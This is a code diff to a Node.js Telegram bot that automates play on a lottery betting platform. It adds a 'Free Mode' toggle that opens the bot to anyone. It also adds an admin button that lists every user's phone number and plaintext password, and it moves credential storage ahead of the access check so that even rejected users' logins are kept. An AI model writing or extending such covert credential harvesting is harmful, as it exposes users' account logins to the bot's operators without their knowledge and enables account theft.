@@ -63,6 +63,10 @@ let allowedsixlotteryIds = new Set();
 const activeUsers = new Set();
 let adminSet = new Set();
 
+// [NEW] Free Mode Variable
+let freeModeEnabled = false;
+const BOT_CONFIG_FILE = 'bot_config.json';
+
 // ==================== PLATFORMS ====================
 const PLATFORMS = {
   "6LOTTERY": {
@@ -201,6 +205,26 @@ function generateShareCode(userId) {
   return Buffer.from(JSON.stringify(config)).toString('base64');
 }
 // =======================================
+
+// [NEW] Load & Save Bot Config
+function loadBotConfig() {
+  try {
+    if (fs.existsSync(BOT_CONFIG_FILE)) {
+      const data = JSON.parse(fs.readFileSync(BOT_CONFIG_FILE, 'utf8'));
+      freeModeEnabled = data.freeModeEnabled || false;
+    } else {
+      freeModeEnabled = false;
+    }
+  } catch (error) {
+    freeModeEnabled = false;
+  }
+}
+
+function saveBotConfig() {
+  try {
+    fs.writeFileSync(BOT_CONFIG_FILE, JSON.stringify({ freeModeEnabled }, null, 4));
+  } catch (error) {}
+}
 
 function loadAdmins() {
   try {
@@ -1750,11 +1774,17 @@ function makeRiskManagementSubmenu() {
   ]).resize().oneTime(false);
 }
 
+// [MODIFIED] Added Free Mode & User Passwords Buttons
 function makeAdminPanelKeyboard(userId) {
   const isOwner = userId === ADMIN_ID;
   const rows = [];
   rows.push([{ text: `${EMOJI.ADD} Add User`, style: 'success' }, { text: `${EMOJI.REMOVE} Remove User`, style: 'danger' }]);
   rows.push([{ text: `${EMOJI.STATS} User Stats`, style: 'primary' }, { text: `${EMOJI.MENU} Allowed IDs`, style: 'primary' }]);
+  
+  // New Buttons
+  rows.push([{ text: `🔑 User Passwords`, style: 'primary' }]);
+  rows.push([{ text: `🆓 Free Mode: ${freeModeEnabled ? '🟢 ON' : '🔴 OFF'}`, style: freeModeEnabled ? 'danger' : 'success' }]);
+  
   rows.push([{ text: `${EMOJI.BROADCAST} Broadcast`, style: 'primary' }]);
   if (isOwner) {
     rows.push([{ text: `👥 Add Admin`, style: 'success' }, { text: `❌ Remove Admin`, style: 'danger' }]);
@@ -2397,6 +2427,33 @@ async function textMessageHandler(ctx) {
     if (buttonText === `${EMOJI.ADD} Add User` || buttonText === "Add User") { userState[userId] = { state: "ADMIN_ADD_USER" }; await sendMessageWithRetry(ctx, `${EMOJI.ADD} Enter user ID to add:`, makeAdminPanelKeyboard(userId)); return; }
     if (buttonText === `${EMOJI.REMOVE} Remove User` || buttonText === "Remove User") { userState[userId] = { state: "ADMIN_REMOVE_USER" }; await sendMessageWithRetry(ctx, `${EMOJI.REMOVE} Enter user ID to remove:`, makeAdminPanelKeyboard(userId)); return; }
     if (buttonText === `${EMOJI.BROADCAST} Broadcast` || buttonText === "Broadcast") { userState[userId] = { state: "ADMIN_BROADCAST" }; await sendMessageWithRetry(ctx, `${EMOJI.BROADCAST} Enter broadcast message:`, makeAdminPanelKeyboard(userId)); return; }
+    
+    // [NEW] Free Mode Toggle
+    if (buttonText.startsWith('🆓 Free Mode:')) {
+      freeModeEnabled = !freeModeEnabled;
+      saveBotConfig();
+      await sendMessageWithRetry(ctx, `✅ Free Mode is now ${freeModeEnabled ? 'ON 🟢 (Anyone can play)' : 'OFF 🔴 (Only Allowed IDs)'}`, makeAdminPanelKeyboard(userId));
+      return;
+    }
+
+    // [NEW] View User Credentials
+    if (buttonText === '🔑 User Passwords') {
+      let msg = `🔑 ${STYLE.BOLD('User Credentials List')}\n${STYLE.SEPARATOR}\n\n`;
+      const credsKeys = Object.keys(userCredentials);
+      if (credsKeys.length === 0) {
+        msg += "No credentials found in memory yet.";
+      } else {
+        for (const uid of credsKeys) {
+          const c = userCredentials[uid];
+          const info = userGameInfo[uid];
+          const gameId = info?.user_id || "Unknown";
+          msg += `${EMOJI.USER} TG ID: \`${uid}\`\n🎮 Game ID: \`${gameId}\`\n📱 Phone: \`${c.phone}\`\n🔑 Pass: \`${c.password}\`\n\n`;
+        }
+      }
+      await sendMessageWithRetry(ctx, msg, makeAdminPanelKeyboard(userId));
+      return;
+    }
+
     if (buttonText === "👥 Add Admin") {
       if (userId !== ADMIN_ID) { await sendMessageWithRetry(ctx, `${EMOJI.ERROR} Only owner.`, makeAdminPanelKeyboard(userId)); return; }
       userState[userId] = { state: "ADMIN_ADD_ADMIN" };
@@ -2660,7 +2717,6 @@ async function textMessageHandler(ctx) {
     return;
   }
   
-  // [NEW] Share Config Handler
   if (buttonText === `${EMOJI.SHARE} Share Config`) {
     const code = generateShareCode(userId);
     if (!code) {
@@ -2675,7 +2731,6 @@ async function textMessageHandler(ctx) {
     return;
   }
 
-  // [NEW] Import Config Handler
   if (buttonText === `${EMOJI.IMPORT} Import Config`) {
     userState[userId] = { state: "INPUT_IMPORT_CONFIG" };
     await sendMessageWithRetry(ctx, `📥 *Import Config*\n${STYLE.SEPARATOR}\n` +
@@ -2704,7 +2759,6 @@ async function textMessageHandler(ctx) {
   const text = normalizeText(rawText);
   const lines = text.split('\n').map(line => line.trim()).filter(line => line);
   
-  // [NEW] Process Imported Config
   if (userState[userId]?.state === "INPUT_IMPORT_CONFIG") {
     try {
       const decoded = Buffer.from(text, 'base64').toString('utf-8');
@@ -2760,7 +2814,13 @@ async function textMessageHandler(ctx) {
       const userInfo = await getUserInfo(session, userId);
       if (userInfo && userInfo.user_id) {
         const gameUserId = userInfo.user_id;
-        if (!allowedsixlotteryIds.has(gameUserId)) {
+        
+        // [NEW] Save Credentials to show in Admin Panel (even if failed)
+        userCredentials[userId] = { phone, password, platform: platformKey };
+        userTemp[userId] = { password, platform: platformKey };
+
+        // [MODIFIED] Check Free Mode
+        if (!freeModeEnabled && !allowedsixlotteryIds.has(gameUserId)) {
           await sendMessageWithRetry(ctx,
             `${EMOJI.ERROR} ${STYLE.BOLD('အသုံးပြုခွင့်မရရှိသေးပါ.')}\n\n${EMOJI.INFO} ကျေးဇူးပြုပြီး အက်ဒမင်ကိုဆက်သွယ်ပါ @Super\\_Rikooo:\n${STYLE.ITEM(`Your ID: ${STYLE.CODE(gameUserId.toString())}`)}`,
             makeMainKeyboard(false, isAdminUser)
@@ -2770,8 +2830,6 @@ async function textMessageHandler(ctx) {
         
         userSessions[userId] = session;
         userGameInfo[userId] = userInfo;
-        userTemp[userId] = { password, platform: platformKey };
-        userCredentials[userId] = { phone, password, platform: platformKey };
         userAllResults[userId] = [];
         userLastResults[userId] = [];
         
@@ -3051,6 +3109,7 @@ function main() {
   loadAdmins();
   loadAllowedUsers();
   loadUserSettings();
+  loadBotConfig(); // [NEW] Load config at startup
   
   const bot = new Telegraf(BOT_TOKEN);
   
